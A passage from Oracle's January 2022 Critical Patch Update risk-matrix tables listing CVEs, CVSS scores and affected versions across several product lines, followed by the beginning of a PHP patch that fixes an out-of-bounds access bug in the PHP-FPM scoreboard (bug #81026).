| CVE-2021-2351 | Oracle Retail Order Broker | System Administration (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 16.0, 18.0, 19.1 |  |
| CVE-2021-2351 | Oracle Retail Order Management System | Upgrade Install (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 19.5 |  |
| CVE-2021-2351 | Oracle Retail Point-of-Service | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1 |  |
| CVE-2021-2351 | Oracle Retail Predictive Application Server | RPAS Server (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1.3, 15.0.3, 16.0.3 |  |
| CVE-2021-2351 | Oracle Retail Price Management | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1, 15, 16 |  |
| CVE-2021-2351 | Oracle Retail Returns Management | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1 |  |
| CVE-2021-2351 | Oracle Retail Service Backbone | RSB Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-2351 | Oracle Retail Xstore Point of Service | Xenvironment (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 17.0.4, 18.0.3, 19.0.2, 20.0.1 |  |
| CVE-2021-22118 | Oracle Retail Customer Management and Segmentation Foundation | Deal (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 16.0-19.0 |  |
| CVE-2021-4104 | Oracle Retail Allocation | General (Apache Log4j) | HTTP | No | 7.5 | Network | High | Low | None | Un- changed | High | High | High | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-23337 | Oracle Retail Customer Management and Segmentation Foundation | Security (Lodash) | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | 19.0 |  |
| CVE-2021-44832 | Oracle Retail Assortment Planning | Application Core (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 16.0.3 | See Note 1 |
| CVE-2021-44832 | Oracle Retail Fiscal Management | NF Issuing (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 14.2 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Back Office | Security (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Central Office | Security (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail EFTLink | Installation (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 16.0.3, 17.0.2, 18.0.1, 19.0.1, 20.0.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Integration Bus | RIB Kernal (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1.3.0, 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Invoice Matching | Security (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 15.0.3, 16.0.3 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Order Broker | System Administration (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 16.0, 18.0, 19.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Order Management System | Upgrade Install (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 19.5 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Point-of-Service | Administration (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Predictive Application Server | RPAS Server (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1.3.46, 15.0.3.115, 16.0.3.240 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Price Management | Security (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 13.2, 14.0.4, 14.1.3, 15.0.3, 16.0.3 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Returns Management | Security (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1 | See Note 1 |
| CVE-2021-45105 | Oracle Retail Service Backbone | RSB Installation (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 14.1.3.0, 14.1.3.2, 15.0.3.1, 16.0.1-16.0.3, 19.0.0, 19.0.1 | See Note 1 |
| CVE-2021-31812 | Oracle Retail Customer Management and Segmentation Foundation | Security (Apache PDFbox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 18.1 |  |
| CVE-2021-29425 | Oracle Retail Assortment Planning | Application Core (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 16.0.3 |  |
| CVE-2021-29425 | Oracle Retail Integration Bus | RIB Kernal (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 14.1.3.2, 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-29425 | Oracle Retail Order Broker | System Administration (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 16.0, 18.0, 19.1 |  |
| CVE-2021-29425 | Oracle Retail Service Backbone | RSB Installation (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 15.0.3.1, 16.0.3, 19.0.1 |  |
| CVE-2021-29425 | Oracle Retail Size Profile Optimization | Application Core (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 16.0.3 |  |

#### Notes:

1. This patch also addresses vulnerabilities CVE-2021-44228 and CVE-2021-45046. Customers need not apply the patches/mitigations of Security Alert CVE-2021-44228 and CVE-2021-45046 for this product.

#### Additional CVEs addressed are:

* The patch for CVE-2021-23337 also addresses CVE-2020-28500.
* The patch for CVE-2021-31812 also addresses CVE-2021-31811.

#### Oracle Siebel CRM Risk Matrix

This Critical Patch Update contains 2 new security patches for Oracle Siebel CRM.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#SECR)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Siebel UI Framework | EAI (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 21.12 and prior |  |
| CVE-2021-44832 | Siebel UI Framework | Enterprise Cache (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 21.12 and prior | See Note 1 |

#### Notes:

1. This patch also addresses vulnerabilities CVE-2021-44228 and CVE-2021-45046. Customers need not apply the patches/mitigations of Security Alert CVE-2021-44228 and CVE-2021-45046 for this product.

#### Additional CVEs addressed are:

* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Oracle Supply Chain Risk Matrix

This Critical Patch Update contains 10 new security patches for Oracle Supply Chain.  8 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#SCP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Agile Engineering Data Management | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 6.2.1.0 |  |
| CVE-2021-2351 | Oracle Agile PLM | Security (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 9.3.6 |  |
| CVE-2021-2351 | Oracle Demantra Demand Management | Security (JDBC, OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.6-12.2.11 |  |
| CVE-2021-2351 | Oracle Product Lifecycle Analytics | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 3.6.1 |  |
| CVE-2021-2351 | Oracle Rapid Planning | Middle Tier (JDBC, OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.2.6-12.2.11 |  |
| CVE-2020-25649 | Agile Product Lifecycle Management Integration Pack for Oracle E-Business Suite | Installation Issues (jackson-databind) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 3.6 |  |
| CVE-2021-35043 | Oracle Agile PLM | Security (AntiSamy) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 9.3.3 |  |
| CVE-2021-36374 | Oracle Agile PLM | Security (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 9.3.6 |  |
| CVE-2020-17521 | Oracle Agile PLM MCAD Connector | CAX Client (Apache Groovy) | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 3.6, 3.4 |  |
| CVE-2021-33037 | Oracle Agile PLM | Security (Apache Tomcat) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 9.3.6 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-36374 also addresses CVE-2021-36373.

#### Oracle Support Tools Risk Matrix

This Critical Patch Update contains 4 new security patches for Oracle Support Tools.  All of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#TOOL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-27568 | OSS Support Tools | Diagnostic Assistant (json-smart) | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | None | High | Prior to 2.12.42 |  |
| CVE-2021-2351 | OSS Support Tools | Diagnostic Assistant (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | Prior to 2.12.42 |  |
| CVE-2016-7103 | OSS Support Tools | Diagnostic Assistant (jQuery UI) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | Prior to 2.12.42 |  |
| CVE-2021-29425 | OSS Support Tools | Diagnostic Assistant (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | Prior to 2.12.42 |  |

#### Oracle Systems Risk Matrix

This Critical Patch Update contains 11 new security patches for Oracle Systems.  7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#SUNS)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-3517 | Oracle ZFS Storage Appliance Kit | Operating System Image | Multiple | Yes | 8.6 | Network | Low | None | None | Un- changed | Low | Low | High | 8.8 |  |
| CVE-2021-2351 | Oracle ZFS Storage Application Integration Engineering Software | Snap Management Utility (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 1.3.3 |  |
| CVE-2020-8285 | Fujitsu M10-1, M10-4, M10-4S, M12-1, M12-2, M12-2S Servers | XCP Firmware (cURL) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to XCP2410, prior to XCP3110 |  |
| CVE-2021-3326 | Fujitsu M10-1, M10-4, M10-4S, M12-1, M12-2, M12-2S Servers | XCP Firmware (glibc) | Multiple | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to XCP2410, prior to XCP3110 |  |
| CVE-2021-23840 | Fujitsu M10-1, M10-4, M10-4S, M12-1, M12-2, M12-2S Servers | XCP Firmware (OpenSSL) | TLS | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | Prior to XCP2410, prior to XCP3110 |  |
| CVE-2020-13817 | Fujitsu M10-1, M10-4, M10-4S, M12-1, M12-2, M12-2S Servers | XCP Firmware (NTP) | NTP | Yes | 7.4 | Network | High | None | None | Un- changed | None | High | High | Prior to XCP2410, prior to XCP3110 |  |
| CVE-2021-43395 | Oracle Solaris | Filesystem | None | No | 6.5 | Local | Low | Low | None | Changed | None | None | High | 11, 10 |  |
| CVE-2022-21375 | Oracle Solaris | Kernel | None | No | 5.5 | Local | Low | Low | None | Un- changed | None | None | High | 11 |  |
| CVE-2022-21271 | Oracle Solaris | Libraries | Multiple | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | 11 |  |
| CVE-2022-21263 | Oracle Solaris | Fault Management Architecture | None | No | 4.8 | Local | Low | Low | Required | Un- changed | Low | Low | Low | 11 |  |
| CVE-2022-21298 | Oracle Solaris | Install | None | No | 3.9 | Local | Low | Low | Required | Un- changed | None | Low | Low | 11 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2020-8285 also addresses CVE-2020-8177 and CVE-2020-8284.
* The patch for CVE-2021-3517 also addresses CVE-2021-3516, CVE-2021-3541 and CVE-2021-36690.

#### Oracle Utilities Applications Risk Matrix

This Critical Patch Update contains 13 new security patches for Oracle Utilities Applications.  7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#UTIL)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2020-14756 | Oracle Utilities Framework | General (Oracle Coherence) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 4.2.0.2.0, 4.2.0.3.0, 4.3.0.1.0-4.3.0.6.0, 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0 |  |
| CVE-2021-27568 | Oracle Utilities Framework | Common (json-smart) | HTTP | Yes | 9.1 | Network | Low | None | None | Un- changed | High | None | High | 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0 |  |
| CVE-2021-39139 | Oracle Utilities Framework | General (XStream) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 4.2.0.2.0, 4.2.0.3.0, 4.3.0.1.0-4.3.0.6.0, 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0 |  |
| CVE-2020-13936 | Oracle Utilities Testing Accelerator | Tools (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1 |  |
| CVE-2021-39139 | Oracle Utilities Testing Accelerator | Tools (XStream) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 6.0.0.1.1 |  |
| CVE-2021-2351 | Oracle Utilities Framework | General (JDBC) | HTTP | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 4.2.0.3.0, 4.3.0.1.0-4.3.0.6.0, 4.4.0.0.0, 4.4.0.2.0, 4.4.0.3.0 |  |
| CVE-2021-2351 | Oracle Utilities Testing Accelerator | Tools (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1 |  |
| CVE-2021-22118 | Oracle Utilities Testing Accelerator | Tools (Spring Framework) | None | No | 7.8 | Local | Low | Low | None | Un- changed | High | High | High | 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1 |  |
| CVE-2021-36090 | Oracle Utilities Testing Accelerator | Tools (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1 |  |
| CVE-2021-4104 | Oracle Utilities Testing Accelerator | Tools (Apache Log4j) | HTTP | No | 7.5 | Network | High | Low | None | Un- changed | High | High | High | 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1 |  |
| CVE-2021-36374 | Oracle Utilities Testing Accelerator | Tools (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 6.0.0.1.1 |  |
| CVE-2021-33037 | Oracle Utilities Testing Accelerator | Tools (Apache Tomcat) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 6.0.0.1.1, 6.0.0.2.2, 6.0.0.3.1 |  |
| CVE-2021-29425 | Oracle Utilities Testing Accelerator | Tools (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 6.0.0.1.1 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2020-14756 also addresses CVE-2020-14642, CVE-2021-2277, CVE-2021-2344, CVE-2021-2371 and CVE-2021-2428.
* The patch for CVE-2021-27568 also addresses CVE-2021-31684.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.
* The patch for CVE-2021-36374 also addresses CVE-2021-36373.
* The patch for CVE-2021-39139 also addresses CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152, CVE-2021-39153 and CVE-2021-39154.

#### Oracle Virtualization Risk Matrix

This Critical Patch Update contains 2 new security patches for Oracle Virtualization.  Neither of these vulnerabilities may be remotely exploitable without authentication, i.e., neither may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#OVIR)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-21394 | Oracle VM VirtualBox | Core | None | No | 6.5 | Local | Low | Low | None | Changed | High | None | None | Prior to 6.1.32 | See Note 1 |
| CVE-2022-21295 | Oracle VM VirtualBox | Core | None | No | 3.8 | Local | Low | Low | None | Changed | Low | None | None | Prior to 6.1.32 |  |

#### Notes:

1. This vulnerability applies to Windows systems only.

Resources for

* [Careers](/careers/)
* [Developers](/developer/)
* [Investors](https://investor.oracle.com/home/default.aspx)
* [Partners](/partner/)
* [Researchers](/research/)
* [Students and Educators](https://academy.oracle.com/en/oa-web-overview.html)

Why Oracle

* [Analyst Reports](/corporate/analyst-reports/)
* [Best cloud-based
  ERP](/erp/what-is-erp/best-erp/)
* [Cloud Economics](/cloud/economics/)
* [Social Impact](/social-impact/)
* [Culture and Inclusion](/careers/diversity-inclusion/)
* [Security Practices](/corporate/security-practices/)

Learn

* [What is cloud
  computing?](/cloud/what-is-cloud-computing/)
* [What is CRM?](/cx/what-is-crm/)
* [What is
  Docker?](/cloud/cloud-native/container-registry/what-is-docker/)
* [What is
  Kubernetes?](/cloud/cloud-native/kubernetes-engine/what-is-kubernetes/)
* [What is
  Python?](/developer/what-is-python-for-developers/)
* [What is SaaS?](/applications/what-is-saas/)

News and Events

* [News](/news/)
* [Oracle CloudWorld](/cloudworld/)
* [Oracle CloudWorld Tour](/cloudworld-tour/)
* [Oracle Health Summit](/health/health-summit/)
* [Oracle Dev Tour](/developer/dev-tour/)
* [Search all events](https://search.oracle.com/events?q=&lang=english)

Contact Us

* US Sales: +1.800.633.0738
* [How can we help?](/corporate/contact/)
* [Subscribe to emails](https://go.oracle.com/subscribe/?l_code=en&src1=OW:O:FO)
* [Integrity Helpline](https://secure.ethicspoint.com/domain/media/en/gui/31053/index.html)
* [Accessibility](/corporate/accessibility/)

---

* [Country/Region](/universal-menu/#u10countrymenu)

* [© 2025 Oracle](/legal/copyright/)
* [Privacy](/legal/privacy/)/[Do Not Sell My
  Info](/legal/privacy/privacy-choices/)
* [Ad
  Choices](/legal/privacy/privacy-policy/#adchoices)
* [Careers](/corporate/careers/)



=== Content from github.com_48ab5259_20250115_115340.html ===
From e28225f76caabcdf210b05bd19cbf4380c3169ac Mon Sep 17 00:00:00 2001
From: Jakub Zelenka
Date: Sat, 2 Oct 2021 22:53:41 +0100
Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to
priv escalation)
The main change is to store scoreboard procs directly to the variable sized
array rather than indirectly through the pointer.
Signed-off-by: Stanislav Malyshev
(cherry picked from commit cb2021e5f69da5e2868130a05bb53db0f9f89e4b)
---
sapi/fpm/fpm/fpm\_children.c | 14 ++---
sapi/fpm/fpm/fpm\_request.c | 4 +-
sapi/fpm/fpm/fpm\_scoreboard.c | 106 ++++++++++++++++++++-------------
sapi/fpm/fpm/fpm\_scoreboard.h | 11 ++--
sapi/fpm/fpm/fpm\_status.c | 4 +-
sapi/fpm/fpm/fpm\_worker\_pool.c | 2 +-
6 files changed, 81 insertions(+), 60 deletions(-)
diff --git a/sapi/fpm/fpm/fpm\_children.c b/sapi/fpm/fpm/fpm\_children.c
index 82c749fc81146..68c493d7645b9 100644
--- a/sapi/fpm/fpm/fpm\_children.c
+++ b/sapi/fpm/fpm/fpm\_children.c
@@ -246,7 +246,7 @@ void fpm\_children\_bury() /\* {{{ \*/
fpm\_child\_unlink(child);
- fpm\_scoreboard\_proc\_free(wp->scoreboard, child->scoreboard\_i);
+ fpm\_scoreboard\_proc\_free(child);
fpm\_clock\_get(&tv1);
@@ -256,9 +256,9 @@ void fpm\_children\_bury() /\* {{{ \*/
if (!fpm\_pctl\_can\_spawn\_children()) {
severity = ZLOG\_DEBUG;
}
- zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", child->wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec);
+ zlog(severity, "[pool %s] child %d exited %s after %ld.%06d seconds from start", wp->config->name, (int) pid, buf, tv2.tv\_sec, (int) tv2.tv\_usec);
} else {
- zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", child->wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec);
+ zlog(ZLOG\_DEBUG, "[pool %s] child %d has been killed by the process management after %ld.%06d seconds from start", wp->config->name, (int) pid, tv2.tv\_sec, (int) tv2.tv\_usec);
}
fpm\_child\_close(child, 1 /\* in event\_loop \*/);
@@ -324,7 +324,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) /
return 0;
}
- if (0 > fpm\_scoreboard\_proc\_alloc(wp->scoreboard, &c->scoreboard\_i)) {
+ if (0 > fpm\_scoreboard\_proc\_alloc(c)) {
fpm\_stdio\_discard\_pipes(c);
fpm\_child\_free(c);
return 0;
@@ -336,7 +336,7 @@ static struct fpm\_child\_s \*fpm\_resources\_prepare(struct fpm\_worker\_pool\_s \*wp) /
static void fpm\_resources\_discard(struct fpm\_child\_s \*child) /\* {{{ \*/
{
- fpm\_scoreboard\_proc\_free(child->wp->scoreboard, child->scoreboard\_i);
+ fpm\_scoreboard\_proc\_free(child);
fpm\_stdio\_discard\_pipes(child);
fpm\_child\_free(child);
}
@@ -349,10 +349,10 @@ static void fpm\_child\_resources\_use(struct fpm\_child\_s \*child) /\* {{{ \*/
if (wp == child->wp) {
continue;
}
- fpm\_scoreboard\_free(wp->scoreboard);
+ fpm\_scoreboard\_free(wp);
}
- fpm\_scoreboard\_child\_use(child->wp->scoreboard, child->scoreboard\_i, getpid());
+ fpm\_scoreboard\_child\_use(child, getpid());
fpm\_stdio\_child\_use\_pipes(child);
fpm\_child\_free(child);
}
diff --git a/sapi/fpm/fpm/fpm\_request.c b/sapi/fpm/fpm/fpm\_request.c
index 83401f1553995..832f9e609b821 100644
--- a/sapi/fpm/fpm/fpm\_request.c
+++ b/sapi/fpm/fpm/fpm\_request.c
@@ -287,7 +287,7 @@ int fpm\_request\_is\_idle(struct fpm\_child\_s \*child) /\* {{{ \*/
struct fpm\_scoreboard\_proc\_s \*proc;
/\* no need in atomicity here \*/
- proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i);
+ proc = fpm\_scoreboard\_proc\_get\_from\_child(child);
if (!proc) {
return 0;
}
@@ -302,7 +302,7 @@ int fpm\_request\_last\_activity(struct fpm\_child\_s \*child, struct timeval \*tv) /\*
if (!tv) return -1;
- proc = fpm\_scoreboard\_proc\_get(child->wp->scoreboard, child->scoreboard\_i);
+ proc = fpm\_scoreboard\_proc\_get\_from\_child(child);
if (!proc) {
return -1;
}
diff --git a/sapi/fpm/fpm/fpm\_scoreboard.c b/sapi/fpm/fpm/fpm\_scoreboard.c
index 328f999f0c9b0..7e9da4d6848a8 100644
--- a/sapi/fpm/fpm/fpm\_scoreboard.c
+++ b/sapi/fpm/fpm/fpm\_scoreboard.c
@@ -6,6 +6,7 @@
#include
#include "fpm\_config.h"
+#include "fpm\_children.h"
#include "fpm\_scoreboard.h"
#include "fpm\_shm.h"
#include "fpm\_sockets.h"
@@ -23,7 +24,6 @@ static float fpm\_scoreboard\_tick;
int fpm\_scoreboard\_init\_main() /\* {{{ \*/
{
struct fpm\_worker\_pool\_s \*wp;
- unsigned int i;
#ifdef HAVE\_TIMES
#if (defined(HAVE\_SYSCONF) && defined(\_SC\_CLK\_TCK))
@@ -40,7 +40,7 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/
for (wp = fpm\_worker\_all\_pools; wp; wp = wp->next) {
- size\_t scoreboard\_size, scoreboard\_nprocs\_size;
+ size\_t scoreboard\_procs\_size;
void \*shm\_mem;
if (wp->config->pm\_max\_children < 1) {
@@ -53,22 +53,15 @@ int fpm\_scoreboard\_init\_main() /\* {{{ \*/
return -1;
}
- scoreboard\_size = sizeof(struct fpm\_scoreboard\_s) + (wp->config->pm\_max\_children) \* sizeof(struct fpm\_scoreboard\_proc\_s \*);
- scoreboard\_nprocs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children;
- shm\_mem = fpm\_shm\_alloc(scoreboard\_size + scoreboard\_nprocs\_size);
+ scoreboard\_procs\_size = sizeof(struct fpm\_scoreboard\_proc\_s) \* wp->config->pm\_max\_children;
+ shm\_mem = fpm\_shm\_alloc(sizeof(struct fpm\_scoreboard\_s) + scoreboard\_procs\_size);
if (!shm\_mem) {
return -1;
}
- wp->scoreboard = shm\_mem;
+ wp->scoreboard = shm\_mem;
+ wp->scoreboard->pm = wp->config->pm;
wp->scoreboard->nprocs = wp->config->pm\_max\_children;
- shm\_mem += scoreboard\_size;
-
- for (i = 0; i < wp->scoreboard->nprocs; i++, shm\_mem += sizeof(struct fpm\_scoreboard\_proc\_s)) {
- wp->scoreboard->procs[i] = shm\_mem;
- }
-
- wp->scoreboard->pm = wp->config->pm;
wp->scoreboard->start\_epoch = time(NULL);
strlcpy(wp->scoreboard->pool, wp->config->name, sizeof(wp->scoreboard->pool));
}
@@ -162,28 +155,48 @@ struct fpm\_scoreboard\_s \*fpm\_scoreboard\_get() /\* {{{\*/
}
/\* }}} \*/
-struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(struct fpm\_scoreboard\_s \*scoreboard, int child\_index) /\* {{{\*/
+static inline struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get\_ex(
+ struct fpm\_scoreboard\_s \*scoreboard, int child\_index, unsigned int nprocs) /\* {{{\*/
{
if (!scoreboard) {
- scoreboard = fpm\_scoreboard;
+ return NULL;
}
- if (!scoreboard) {
+ if (child\_index < 0 || (unsigned int)child\_index >= nprocs) {
return NULL;
}
+ return &scoreboard->procs[child\_index];
+}
+/\* }}} \*/
+
+struct fpm\_scoreboard\_proc\_s \*fpm\_scoreboard\_proc\_get(
